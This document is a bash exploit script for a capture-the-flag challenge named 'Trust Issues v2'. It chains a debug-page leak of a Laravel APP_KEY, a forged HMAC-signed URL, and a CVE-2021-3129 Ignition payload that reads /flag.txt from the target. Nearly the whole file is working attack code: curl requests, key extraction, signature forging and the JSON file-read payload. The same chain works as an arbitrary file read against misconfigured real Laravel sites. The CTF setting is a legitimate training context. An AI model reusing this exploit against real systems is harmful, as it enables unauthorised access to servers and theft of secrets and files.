#!/bin/bash
#
# Trust Issues v2 CTF Exploit - CVE-2021-3129 + Signed URL Chain
# Usage: ./exploit.sh <target_url>
# Example: ./exploit.sh http://localhost:5050
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

TARGET="${1:-http://localhost:5050}"
TARGET="${TARGET%/}"  # Remove trailing slash

echo -e "${BLUE}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  Trust Issues v2: CVE-2021-3129 + Signed URL Chain        ║"
echo "║  Bash Exploit                                             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${BLUE}[*]${NC} Target: ${TARGET}"
echo ""

# Step 1: Check if Ignition endpoint is protected
echo -e "${BLUE}[*]${NC} Step 1: Checking if Ignition endpoint requires signature..."

IGNITION_CHECK=$(curl -s -X POST "${TARGET}/_ignition/execute-solution" \
    -H "Content-Type: application/json" \
    -d '{"test":"test"}' \
    -w "%{http_code}" -o /tmp/ignition_check.txt)

if [ "$IGNITION_CHECK" = "403" ]; then
    echo -e "${GREEN}[+]${NC} Ignition endpoint is protected with signed URL (as expected)"
else
    echo -e "${YELLOW}[!]${NC} Unexpected response: ${IGNITION_CHECK}"
fi
echo ""

# Step 2: Trigger error and capture debug page
echo -e "${BLUE}[*]${NC} Step 2: Triggering error via malformed node_id to leak APP_KEY..."

DEBUG_RESPONSE=$(curl -s "${TARGET}/api/node/status?node_id=kj" \
    -H "Accept: text/html" \
    -H "User-Agent: Mozilla/5.0")

# Check if we got a debug page with APP_KEY
if echo "$DEBUG_RESPONSE" | grep -q "APP_KEY"; then
    echo -e "${GREEN}[+]${NC} Debug page received with APP_KEY!"
else
    echo -e "${YELLOW}[!]${NC} Trying alternative payload..."
    DEBUG_RESPONSE=$(curl -s "${TARGET}/api/node/status?node_id=!!!INVALID!!!" \
        -H "Accept: text/html")
fi

# Save for debugging
echo "$DEBUG_RESPONSE" > /tmp/debug_response.html

# Step 3: Extract APP_KEY
echo -e "${BLUE}[*]${NC} Step 3: Extracting APP_KEY..."

# Extract APP_KEY - works on both GNU and BSD grep
APP_KEY=$(echo "$DEBUG_RESPONSE" | grep -o 'base64:[A-Za-z0-9+/=]*' | head -1)

if [ -z "$APP_KEY" ]; then
    echo -e "${RED}[-]${NC} Could not extract APP_KEY"
    echo -e "${YELLOW}[!]${NC} Debug response saved to /tmp/debug_response.html"
    exit 1
fi

echo -e "${GREEN}[+]${NC} Found APP_KEY: ${APP_KEY}"
echo ""

# Step 4: Forge signed URL for Ignition endpoint
echo -e "${BLUE}[*]${NC} Step 4: Forging signed URL for /_ignition/execute-solution..."

EXPIRES=$(($(date +%s) + 300))
URL_TO_SIGN="${TARGET}/_ignition/execute-solution?expires=${EXPIRES}"

echo -e "${BLUE}[*]${NC} URL to sign: ${URL_TO_SIGN}"

# Generate HMAC-SHA256 signature
# CRITICAL: Laravel uses the RAW APP_KEY string (with base64: prefix) as the HMAC key!
SIGNATURE=$(echo -n "${URL_TO_SIGN}" | openssl dgst -sha256 -hmac "${APP_KEY}" 2>/dev/null | awk '{print $NF}')

echo -e "${GREEN}[+]${NC} Signature: ${SIGNATURE}"

SIGNED_URL="${URL_TO_SIGN}&signature=${SIGNATURE}"
echo ""
echo -e "${GREEN}[+]${NC} Forged URL:"
echo -e "${YELLOW}${SIGNED_URL}${NC}"
echo ""

# Step 5: Exploit CVE-2021-3129 to read /flag.txt
echo -e "${BLUE}[*]${NC} Step 5: Exploiting CVE-2021-3129 to read /flag.txt..."

# CVE-2021-3129 payload - MakeViewVariableOptionalSolution for file read
PAYLOAD='{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "/flag.txt"
  }
}'

CVE_RESPONSE=$(curl -s -X POST "${SIGNED_URL}" \
    -H "Content-Type: application/json" \
    -d "${PAYLOAD}")

# Save response
echo "$CVE_RESPONSE" > /tmp/cve_response.txt

# Extract flag
FLAG=$(echo "$CVE_RESPONSE" | grep -o 'FLAG{[^}]*}' | head -1)

if [ -n "$FLAG" ]; then
    echo ""
    echo "============================================================"
    echo -e "${GREEN}[+] FLAG CAPTURED: ${FLAG}${NC}"
    echo "============================================================"
else
    echo -e "${YELLOW}[!]${NC} Flag pattern not found in response"
    echo -e "${YELLOW}[!]${NC} Response preview:"
    echo "$CVE_RESPONSE" | head -30
    echo ""
    echo -e "${YELLOW}[!]${NC} Full response saved to /tmp/cve_response.txt"
    echo ""
    echo -e "${BLUE}[*]${NC} You can try manually with:"
    echo "curl -X POST '${SIGNED_URL}' \\"
    echo "  -H 'Content-Type: application/json' \\"
    echo "  -d '${PAYLOAD}'"
fi
